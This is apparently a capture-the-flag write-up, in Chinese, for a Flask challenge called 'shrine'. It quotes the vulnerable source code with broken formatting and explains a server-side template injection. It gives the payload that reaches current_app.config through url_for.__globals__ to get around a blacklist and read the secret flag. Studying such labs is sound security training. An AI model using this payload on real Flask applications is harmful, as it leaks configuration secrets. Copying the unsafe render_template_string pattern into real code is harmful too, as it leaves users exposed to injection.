import os

app.config[‘FLAG’] = os.environ.pop(‘FLAG’)

@app.route(‘/‘)

return open(file).read()

@app.route(‘/shrine/‘)
def shrine(shrine):

def safe_jinja(s):
    s = s.replace('(', '').replace(')', '')
    blacklist = ['config', 'self']
    return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s

return flask.render_template_string(safe_jinja(shrine))

if name == ‘main‘:
app.run(debug=True)

代码第20行出现SSTI注入的痕迹，并且可能是jinja渲染的
可以看到flag应该在config里面，正常来说只要输入{{config}}就能显示出config，但是很遗憾，本题设置了黑名单，过滤config
因此要用别的代码来执行
此题使用的是url_for或者get_flashed_message
/shrine/{{url_for.__globals__}},在出现的一大堆变量里找到一个current_app
然后/shrine/{{url_for.__globals__['current_app'].config}}查看config即可拿到flag

##1.url_for()作用:
#(1)给指定的函数构造 URL。
#(2)访问静态文件(CSS / JavaScript 等)。 只要在你的包中或是模块的所在目录中创建一个名为 static 的文件夹，在应用中使用 /static 即可访问。

##2current_app
#在flask内部维护者两个线程隔离的栈，current_app指向了AppContext(应用上下文)中的栈顶
#相当于一个指针吧
